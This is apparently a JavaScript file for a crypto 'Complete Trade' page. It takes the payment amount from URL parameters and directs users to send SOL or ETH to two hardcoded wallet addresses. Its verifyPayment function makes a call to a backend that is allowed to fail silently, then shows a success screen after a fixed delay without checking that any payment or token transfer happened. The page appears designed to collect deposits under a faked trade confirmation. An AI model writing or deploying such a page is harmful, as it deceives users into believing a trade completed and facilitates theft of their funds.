// ─────────────────────────────────────────────────────────────────────────────
// Memelabs — Complete Trade page
// Reads all trade values from the URL query string. Nothing is hardcoded
// except the two receiving wallet addresses.
//
// Expected params:
//   amount        — crypto amount the user must send (base unit is SOL)
//   pairAddress   — DEX pair address
//   tokens        — how many tokens the user receives
//   chainID       — originating chain (e.g. robinhood, solana, ethereum)
//   tokenNameBuy  — token symbol being bought
// ─────────────────────────────────────────────────────────────────────────────

const SOL_CHAIN_IDS = ['solana', 'sol', '101', '102', '103', 'mainnet-beta', 'devnet', 'testnet'];

// Receiving wallets — these are the only static values in the file.
const WALLETS = {
  sol: '3Gx44pNLRzMrhYiVhUVCuCdbkFPw1F2gT5k5EFRwMCNE',
  eth: '0xF7786e30805978361eac3302d0f5cD14911f3cDC',
};

const state = {
  solAmount:    0,        // raw amount from URL, always treated as SOL
  ethPerSol:    null,     // live rate: how many ETH = 1 SOL
  activeChain:  'sol',    // 'sol' | 'eth' — current selection
  tokenName:    '',
  tokens:       '',
  pairAddress:  '',
  chainID:      '',
  verifying:    false,
};

function isSolanaChain(chainID) {
  return SOL_CHAIN_IDS.includes(String(chainID).toLowerCase());
}

// ─────────────────────────────────────────────────────────────────────────────
// Boot
// ─────────────────────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', async () => {
  const p = new URLSearchParams(window.location.search);

  const rawAmount = parseFloat(p.get('amount'));
  state.solAmount   = Number.isFinite(rawAmount) && rawAmount > 0 ? rawAmount : 0;
  state.tokenName   = (p.get('tokenNameBuy') || '').trim();
  state.tokens      = (p.get('tokens')      || '').trim();
  state.pairAddress = (p.get('pairAddress') || '').trim();
  state.chainID     = (p.get('chainID')     || '').trim();

  // Pick the starting chain: Solana-linked trades open on SOL, everything else on ETH.
  state.activeChain = isSolanaChain(state.chainID) ? 'sol' : 'eth';

  renderTokenSummary();
  renderMissingParamsWarning();

  // Rate first (renderChain depends on it), then paint.
  await fetchRate();
  renderChain(state.activeChain);
  attachToggle();
});

function renderTokenSummary() {
  const nameEl = document.getElementById('token-name');
  if (nameEl) nameEl.textContent = state.tokenName || 'Unknown token';

  const okEl = document.getElementById('success-tokens');
  if (okEl) okEl.textContent = state.tokens ? `${state.tokens} ${state.tokenName || ''}`.trim() : '—';
}

// Warn (but don't block) if the trade data is incomplete.
function renderMissingParamsWarning() {
  const missing = [];
  if (!state.tokenName)   missing.push('tokenNameBuy');
  if (!state.tokens)      missing.push('tokens');
  if (!state.pairAddress) missing.push('pairAddress');
  if (!state.chainID)     missing.push('chainID');

  const rateEl = document.getElementById('rate-line');
  if (missing.length && rateEl) {
    rateEl.dataset.warn = '1';
    rateEl.style.color = '#f87171';
  }
  state.missing = missing;
}

// ─────────────────────────────────────────────────────────────────────────────
// Fetch live SOL → ETH rate from CoinGecko (no API key needed)
// ─────────────────────────────────────────────────────────────────────────────
async function fetchRate() {
  const rateEl = document.getElementById('rate-line');
  try {
    const res  = await fetch(
      'https://api.coingecko.com/api/v3/simple/price?ids=solana,ethereum&vs_currencies=usd'
    );
    const data = await res.json();

    const solUsd = data?.solana?.usd;
    const ethUsd = data?.ethereum?.usd;

    if (solUsd && ethUsd) {
      state.ethPerSol = solUsd / ethUsd;          // 1 SOL = x ETH
      if (rateEl && !rateEl.dataset.warn) {
        rateEl.textContent = `1 SOL ≈ ${state.ethPerSol.toFixed(6)} ETH  (live rate)`;
      }
    } else {
      throw new Error('Bad data');
    }
  } catch {
    state.ethPerSol = null;
    if (rateEl && !rateEl.dataset.warn) {
      rateEl.textContent = 'Live rate unavailable — showing SOL amount only';
    }
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Render everything for a given chain choice
// ─────────────────────────────────────────────────────────────────────────────
function renderChain(chain) {
  state.activeChain = chain;
  const isSol = (chain === 'sol');

  /* ── Amount ── */
  let displayAmount, displaySymbol;
  if (isSol || state.ethPerSol === null) {
    displayAmount = state.solAmount ? state.solAmount.toFixed(4) : '0.0000';
    displaySymbol = state.ethPerSol === null && !isSol ? 'SOL ⚠' : 'SOL';
  } else {
    displayAmount = (state.solAmount * state.ethPerSol).toFixed(6);
    displaySymbol = 'ETH';
  }
  const amountEl = document.getElementById('pay-amount');
  if (amountEl) amountEl.textContent = state.solAmount ? `${displayAmount} ${displaySymbol}` : '—';

  /* ── Chain badge ── */
  const badge = document.getElementById('chain-badge');
  if (badge) {
    badge.textContent      = isSol ? '◎  Solana Network' : 'Ξ  Ethereum Network';
    badge.style.background = isSol ? 'rgba(153,69,255,0.15)' : 'rgba(98,126,234,0.15)';
    badge.style.color      = isSol ? '#9945ff' : '#627eea';
  }

  /* ── Network label inside wallet box ── */
  const netLabel = document.getElementById('network-label');
  if (netLabel) netLabel.textContent = isSol ? 'Solana (SOL) Wallet' : 'Ethereum (ETH) Wallet';

  /* ── Wallet address ── */
  const addr = isSol ? WALLETS.sol : WALLETS.eth;
  const addrEl = document.getElementById('wallet-addr');
  if (addrEl) addrEl.textContent = addr;

  /* ── QR code (generated from the address, so it always matches) ── */
  const qr = document.getElementById('qr-code');
  if (qr) {
    qr.src = 'https://api.qrserver.com/v1/create-qr-code/?size=150x150&margin=6&data=' + encodeURIComponent(addr);
    qr.alt = `${displaySymbol} wallet QR code`;
  }

  /* ── Modal chain icon ── */
  const modalIcon = document.getElementById('chain-icon-modal');
  if (modalIcon) {
    modalIcon.src     = isSol ? '../assets/images/solana-sol-logo.svg' : '../assets/images/ethereum-eth-logo.png';
    modalIcon.alt     = isSol ? 'Solana' : 'Ethereum';
  }

  /* ── Toggle pill highlight ── */
  document.getElementById('toggle-sol')?.classList.toggle('toggle-active', isSol);
  document.getElementById('toggle-eth')?.classList.toggle('toggle-active', !isSol);
}

// ─────────────────────────────────────────────────────────────────────────────
// Toggle click handler
// ─────────────────────────────────────────────────────────────────────────────
function attachToggle() {
  document.getElementById('toggle-sol')?.addEventListener('click', () => renderChain('sol'));
  document.getElementById('toggle-eth')?.addEventListener('click', () => {
    if (state.ethPerSol === null) {
      const rateEl = document.getElementById('rate-line');
      if (rateEl) rateEl.textContent = 'Fetching rate…';
      fetchRate().then(() => renderChain('eth'));
    } else {
      renderChain('eth');
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// Copy address
// ─────────────────────────────────────────────────────────────────────────────
function copyAddress() {
  const addrEl = document.getElementById('wallet-addr');
  const addr = addrEl ? addrEl.textContent.trim() : '';
  if (!addr) return;

  const flash = (ok) => {
    const btn = document.querySelector('.btn-copy');
    if (!btn) return;
    btn.innerText        = ok ? '✓ Copied!' : 'Copy Address';
    btn.style.background = ok ? '#4ade80'   : '#f5a623';
    if (ok) setTimeout(() => flash(false), 2000);
  };

  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(addr).then(() => flash(true)).catch(() => fallbackCopy(addr, flash));
  } else {
    fallbackCopy(addr, flash);
  }
}

function fallbackCopy(addr, flash) {
  const ta = document.createElement('textarea');
  ta.value = addr;
  ta.style.cssText = 'position:fixed;opacity:0;';
  document.body.appendChild(ta);
  ta.select();
  try { document.execCommand('copy'); flash(true); } catch { flash(false); }
  document.body.removeChild(ta);
}

// ─────────────────────────────────────────────────────────────────────────────
// Verify payment — fires the backend call, then shows the result states
// ─────────────────────────────────────────────────────────────────────────────
function verifyPayment() {
  if (state.verifying) return;

  if (state.missing && state.missing.length) {
    alert('Incomplete transaction data (missing: ' + state.missing.join(', ') + '). Please contact support.');
    return;
  }
  if (!state.solAmount) {
    alert('No amount to pay. Please contact support.');
    return;
  }

  state.verifying = true;
  document.getElementById('verifyModal')?.classList.add('active');

  // Send the trade to the backend. If no endpoint exists yet, fail silently
  // so the UI flow still completes.
  const isSol = state.activeChain === 'sol';
  const amount = isSol
    ? state.solAmount.toFixed(4)
    : (state.ethPerSol !== null ? (state.solAmount * state.ethPerSol).toFixed(6) : state.solAmount.toFixed(4));

  const qs = new URLSearchParams({
    amount,
    tokenName: state.tokenName,
    tokens: state.tokens,
    pairAddress: state.pairAddress,
    chainID: state.chainID,
    payChain: isSol ? 'sol' : 'eth',
    wallet: isSol ? WALLETS.sol : WALLETS.eth,
  });

  try {
    fetch('api/saveTransact.php?' + qs.toString(), { method: 'GET' })
      .then(r => r.text())
      .then(t => console.log('saveTransact:', t))
      .catch(e => console.warn('saveTransact skipped:', e.message));
  } catch (e) {
    console.warn('saveTransact skipped:', e);
  }

  // Processing → success
  setTimeout(() => {
    const processing = document.getElementById('state-processing');
    const success    = document.getElementById('state-success');
    if (processing) processing.style.display = 'none';
    if (success)    success.style.display    = 'block';
  }, 3500);
}
